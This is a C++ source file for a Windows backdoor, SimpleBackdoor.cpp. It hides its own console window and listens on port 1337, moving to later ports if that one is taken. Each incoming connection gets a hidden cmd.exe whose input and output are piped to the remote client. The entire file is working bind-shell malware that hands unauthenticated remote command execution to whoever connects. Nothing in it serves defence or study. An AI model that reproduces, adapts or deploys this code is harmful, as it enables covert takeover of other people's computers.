// SimpleBackdoor.cpp : Main code
// Portions of this code are from  http://hackforlifeee.wordpress.com/2012/01/13/basic-backdoor-c/

//build includes and library
#include "stdafx.h"
#pragma comment(lib, "wsock32.lib") //for winsock

#define PORT_NUMBER 1337
#define MAX_CONNECTIONS 15
#define SOCKET_TIMEOUT 5

using namespace std;

HANDLE mutexh_backdoor; //initialize global mutex

DWORD WINAPI handlePrompt(void*); //prototype

int _tmain(int argc, _TCHAR* argv[])
{
	//Hide console
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);

	mutexh_backdoor = CreateMutex(NULL, FALSE, NULL); //Create a mutex

	//Set up timeouts and file descriptors for the select() function
	struct timeval tv;
	tv.tv_sec = SOCKET_TIMEOUT; //number of seconds to wait before timing out and returning
	tv.tv_usec = 0; //number of microseconds to wait before timing out and returning
	fd_set totalSet;  //totalSet file descriptor
	fd_set tempSet; //temporary file descriptor
	int fdmax;  //maximum file descriptors
	FD_ZERO(&totalSet); //zero totalSet and tempSet file descriptors
	FD_ZERO(&tempSet);
	int rc = 1; //return value of the select() function

	//set up sockets, structs, and wsadata
	SOCKET localSock, remoteSock; 
	SOCKADDR_IN localSaddr;
	WSADATA wsadata; 

	WSAStartup(MAKEWORD(1, 1), &wsadata); //use winsock v1

	//setup socket
	int port = PORT_NUMBER;
	localSock = socket(AF_INET, SOCK_STREAM, 0);
	localSaddr.sin_family = AF_INET;
	localSaddr.sin_port = htons(port);
	localSaddr.sin_addr.s_addr = INADDR_ANY;

	while (1){ //setup complete, listen for 
		int fails = 0;
		port = PORT_NUMBER; //reset the port number so we can check for ports being open again
		SOCKET tempsock = localSock;

		while (bind(localSock, (SOCKADDR*)&localSaddr, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
		{
			//if binding fails attempt to bind to the next port
			fails++;
			port++;
			localSaddr.sin_port = htons(port);
			localSock = tempsock;
			printf("bind error");
			Sleep(1000);
			if (fails > 15) //if it fails to bind over 15 times then quit
				break;
		}
		
		//listen on the socket
		if (listen(localSock, MAX_CONNECTIONS) == SOCKET_ERROR) 
		{
			WSACleanup();
			printf("Error listening socket.");
			break;
		}

		// add the listener to the totalSet
		//this allows the select function to monitor for activity on the socket
		FD_SET(localSock, &totalSet);

		// keep track of the biggest file descriptor
		fdmax = localSock;

		//once bound listen forever
		while (1)
		{
			remoteSock = SOCKET_ERROR;
			while (remoteSock == SOCKET_ERROR)
			{
				tempSet = totalSet; // copy totalSet set to the tempSet
				rc = select(fdmax + 1, &tempSet, NULL, NULL, &tv); //check the socket
				if (rc == -1) { //there was a problem with the socket, die
					perror("select");
					break;
				}
				else if (rc > 0){ //select() returns 1 if there was activity on the file descriptor
					//accept and spawn a new thread to handle the connection
					remoteSock = accept(localSock, NULL, NULL);
					CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)handlePrompt, (void *)&remoteSock, 0, NULL);
					Sleep(200);
				}
			}
		}
	}
	return 0;
}

DWORD WINAPI handlePrompt(void* premoteSock)
{
	//Get socket from void pointer
	WaitForSingleObject(mutexh_backdoor, INFINITE);
	SOCKET remoteSock;
	memcpy(&remoteSock, premoteSock, sizeof(SOCKET));
	ReleaseMutex(mutexh_backdoor);

	//Set up buffers
	char recvBuf[1024];
	char sendBuf[65535];
	HANDLE newstdin, newstdout, readout, writein = NULL; //the handles for our pipes
	DWORD bytesRead, avail, exitcode, bytesWritten;


	//Set up structs for CreateProcess
	STARTUPINFO sinfo; //startupinfo structure for CreateProcess
	PROCESS_INFORMATION pinfo; //process info struct needed for CreateProcess
	ZeroMemory(&sinfo, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	ZeroMemory(&pinfo, sizeof(pinfo));
	SECURITY_ATTRIBUTES secat; //security attributes structure needed for CreateProcess
	secat.nLength = sizeof(SECURITY_ATTRIBUTES);
	secat.lpSecurityDescriptor = NULL;
	secat.bInheritHandle = TRUE;

	//create the pipes for our command prompt
	CreatePipe(&newstdin, &writein, &secat, 0);
	CreatePipe(&readout, &newstdout, &secat, 0);

	GetStartupInfo(&sinfo); //fill startup struct
	sinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	sinfo.wShowWindow = SW_HIDE; //hide command prompt on launch
	sinfo.hStdOutput = newstdout; //redirect stdout
	sinfo.hStdError = newstdout; //redirect stderr
	sinfo.hStdInput = newstdin; //redirect stdin

	char exit1[] = { 'e', 'x', 'i', 't', 10, 0 }; //we need this to compare our command to ‘exit’
	char exit2[] = { 'E', 'X', 'I', 'T', 10, 0 }; //we need this to compare our command to ‘EXIT’

	//start cmd prompt
	LPTSTR szCmdline = _tcsdup(TEXT("C:\\Windows\\System32\\cmd.exe"));
	Sleep(20);
	if (CreateProcess(NULL, szCmdline, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &sinfo, &pinfo) == FALSE){
		cout << "Could not spawn cmd.exe\n";
		goto closeup;
	}
	while (1)
	{
		//check if cmd.exe is still running, if not then cleanup and start listening again.
		if (GetExitCodeProcess(pinfo.hProcess, &exitcode) == STILL_ACTIVE)
		{
			cout << "CMD exited" << endl;
			goto cmdfail;
		}
		bytesRead = 0;

		//sleep 0.5 seconds to give cmd.exe the chance to startup
		Sleep(500);

		//check if the pipe already contains something we can write to output
		PeekNamedPipe(readout, sendBuf, sizeof(sendBuf), &bytesRead, &avail, NULL);
		if (bytesRead != 0)
		{
			while (bytesRead != 0)
			{    
				//read data from cmd.exe and send to client, then clear the buffer
				ReadFile(readout, sendBuf, sizeof(sendBuf), &bytesRead, NULL);
				if (send(remoteSock, sendBuf, strlen(sendBuf), 0) == SOCKET_ERROR){
					cout << "Socket closed\n";
					goto closeup;
				}
				ZeroMemory(sendBuf, sizeof(sendBuf));
				Sleep(100);
				PeekNamedPipe(readout, sendBuf, sizeof(sendBuf), &bytesRead, &avail, NULL);
			}
		}
		ZeroMemory(recvBuf, sizeof(recvBuf)); // clear recvBuf

		//receive the command given
		if (recv(remoteSock, recvBuf, sizeof(recvBuf), 0) == SOCKET_ERROR){
			cout << "Socket closed\n";
			goto closeup;
		}
		//if command is ‘exit’ or ‘EXIT’ then we have to capture it to prevent our program
		//from hanging.
		if ((strcmp(recvBuf, exit1) == 0) || (strcmp(recvBuf, exit2) == 0))
		{
			//let cmd.exe close by giving the command, then go to closeup label
			WriteFile(writein, recvBuf, strlen(recvBuf), &bytesWritten, NULL);
			goto closeup;
		}
		//else write the command to cmd.exe
		WriteFile(writein, recvBuf, strlen(recvBuf), &bytesWritten, NULL);
		//clear the recvBuf
		ZeroMemory(recvBuf, sizeof(recvBuf));
	}

//close up all handles and the socket
closeup:
	CloseHandle(writein);
	CloseHandle(readout);
	CloseHandle(newstdout);
	CloseHandle(newstdin);
cmdfail:
	CloseHandle(pinfo.hThread);
	CloseHandle(pinfo.hProcess);
	closesocket(remoteSock);
	return EXIT_SUCCESS;
}